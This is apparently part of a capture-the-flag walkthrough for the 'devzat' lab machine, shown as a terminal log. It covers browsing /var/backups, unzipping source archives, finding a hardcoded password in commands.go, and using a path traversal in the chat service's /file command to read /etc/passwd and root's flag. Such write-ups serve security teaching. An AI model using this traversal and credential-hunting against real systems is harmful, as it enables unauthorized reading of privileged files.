+-rw-------   1 root      root                241 Sep 28 18:42 ubuntu-advantage.log.2.gz
+-rw-------   1 root      root                697 Oct 11 14:21 vmware-network.1.log
+-rw-------   1 root      root                697 Sep 29 16:25 vmware-network.2.log
+-rw-------   1 root      root                697 Sep 29 11:48 vmware-network.3.log
+-rw-------   1 root      root                697 Sep 28 19:10 vmware-network.4.log
+-rw-------   1 root      root                697 Sep 28 18:30 vmware-network.5.log
+-rw-------   1 root      root                697 Sep 24 14:55 vmware-network.6.log
+-rw-------   1 root      root                697 Sep 23 15:06 vmware-network.7.log
+-rw-------   1 root      root                697 Sep 23 15:02 vmware-network.8.log
+-rw-------   1 root      root                697 Sep 21 19:22 vmware-network.9.log
+-rw-------   1 root      root                697 Nov  5 05:20 vmware-network.log
+-rw-------   1 root      root               1687 Oct 11 14:29 vmware-vmsvc-root.1.log
+-rw-------   1 root      root               1875 Oct 11 14:26 vmware-vmsvc-root.2.log
+-rw-------   1 root      root               1875 Sep 29 16:34 vmware-vmsvc-root.3.log
+-rw-------   1 root      root               4710 Nov  5 05:20 vmware-vmsvc-root.log
+-rw-------   1 root      root               4852 Nov  5 05:20 vmware-vmtoolsd-root.log
+-rw-rw-r--   1 root      utmp              82176 Nov  6 01:38 wtmp
+
+
+catherine@devzat:/var$ ls -la backups/
+total 1132
+drwxr-xr-x  2 root      root        4096 Nov  5 06:25 .
+drwxr-xr-x 14 root      root        4096 Jun 22 18:34 ..
+-rw-r--r--  1 root      root       51200 Nov  5 06:25 alternatives.tar.0
+-rw-r--r--  1 root      root       59142 Sep 28 18:45 apt.extended_states.0
+-rw-r--r--  1 root      root        6588 Sep 21 20:17 apt.extended_states.1.gz
+-rw-r--r--  1 root      root        6602 Jul 16 06:41 apt.extended_states.2.gz
+-rw-------  1 catherine catherine  28297 Jul 16 07:00 devzat-dev.zip
+-rw-------  1 catherine catherine  27567 Jul 16 07:00 devzat-main.zip
+-rw-r--r--  1 root      root         268 Sep 29 11:46 dpkg.diversions.0
+-rw-r--r--  1 root      root         170 Jul 16 06:41 dpkg.statoverride.0
+-rw-r--r--  1 root      root      951869 Sep 28 18:45 dpkg.status.0
+
+catherine@devzat:/var$ cd backups/
+catherine@devzat:/var/backups$ cp *.zip ~
+
+catherine@devzat:~$ unzip devzat-main.zip
+Archive:  devzat-main.zip
+   creating: main/
+  inflating: main/go.mod             
+ extracting: main/.gitignore         
+  inflating: main/util.go            
+  inflating: main/eastereggs.go      
+  inflating: main/README.md          
+  inflating: main/games.go           
+  inflating: main/colors.go          
+ extracting: main/log.txt            
+  inflating: main/commands.go        
+  inflating: main/start.sh           
+  inflating: main/devchat.go         
+  inflating: main/LICENSE            
+  inflating: main/commandhandler.go  
+  inflating: main/art.txt            
+  inflating: main/go.sum             
+  inflating: main/allusers.json
+
+  catherine@devzat:~$ unzip devzat-dev.zip 
+Archive:  devzat-dev.zip
+   creating: dev/
+  inflating: dev/go.mod              
+ extracting: dev/.gitignore          
+  inflating: dev/util.go             
+  inflating: dev/testfile.txt        
+  inflating: dev/eastereggs.go       
+  inflating: dev/README.md           
+  inflating: dev/games.go            
+  inflating: dev/colors.go           
+ extracting: dev/log.txt             
+  inflating: dev/commands.go         
+  inflating: dev/start.sh            
+  inflating: dev/devchat.go          
+  inflating: dev/LICENSE             
+  inflating: dev/commandhandler.go   
+  inflating: dev/art.txt             
+  inflating: dev/go.sum              
+ extracting: dev/allusers.json 
+
+
+ cd dev
+ cat commands.go
+ 
+file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
+func fileCommand(u *user, args []string) {
+        pass := args[1]
+        // Check my secure password
+        if pass != "CeilingCatStillAThingIn2021?" {
+                u.system("You did provide the wrong password")
+                return
+        }
+
+
+ssh -l patrick pets.devzat.htb -p 8000
+
+test: /file /etc/passwd
+[SYSTEM] Command not found..? Check /help for a list of commands
+
+ssh -l test 127.0.0.1 -p 8443
+
+test: /file /etc/passwd CeilingCatStillAThingIn2021?
+[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
+
+test: /file ../root.txt CeilingCatStillAThingIn2021?
+[SYSTEM] 694e09892ec6e32fb4d1eabdcd1b37c9
